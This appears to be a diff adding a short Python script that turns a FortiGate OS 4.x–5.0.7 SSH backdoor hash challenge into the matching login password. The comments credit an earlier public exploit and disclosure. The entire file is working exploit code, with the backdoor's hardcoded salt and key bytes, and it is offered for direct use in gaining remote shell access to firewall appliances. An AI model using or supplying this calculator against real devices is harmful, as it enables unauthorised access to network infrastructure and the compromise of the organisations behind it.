@@ -1,0 +1,13 @@
+#Password calculator for FortiGate OS Version 4.x - 5.0.7 SSH backdoor, feed a hash, get a password
+#password port by rishabh - admin@theprohack.com original exploit by operator8203@runbox.com
+#refer seclists.org/fulldisclosure/2016/Jan/26
+#wrote this quick and dirty script as was having issues with termios and paramiko on my box.
+import base64
+import hashlib
+print "Enter hash challenge " ; chash = raw_input()
+pwdhash = hashlib.sha1()
+pwdhash.update('\x00' * 12)
+pwdhash.update(chash + 'FGTAbc11*xy+Qqz27')
+pwdhash.update('\xA3\x88\xBA\x2E\x42\x4C\xB0\x4A\x53\x79\x30\xC1\x31\x07\xCC\x3F\xA1\x32\x90\x29\xA9\x81\x5B\x70')
+fhash = 'AK1' + base64.b64encode('\x00' * 12 + pwdhash.digest())
+print "password is %s" %fhash
